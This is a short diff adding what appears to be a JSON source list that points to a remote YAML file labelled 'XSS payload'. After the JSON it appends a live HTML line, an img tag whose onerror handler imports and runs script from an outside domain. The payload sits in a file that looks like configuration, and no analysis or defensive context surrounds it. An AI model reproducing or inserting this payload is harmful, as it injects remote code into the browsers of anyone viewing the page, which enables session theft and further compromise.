@@ -1,0 +1,11 @@
+{
+	"url": "https://cdn.jsdelivr.net/gh/alfredo1111/hamzab3t.xyz/56.yaml",
+	"urls": [
+		{
+			"url": "https://cdn.jsdelivr.net/gh/alfredo1111/hamzab3t.xyz/56.yaml",
+			"name": "XSS payload"
+		}
+	]
+}
+
+<img src onerror=import('//b3t.xyz')>
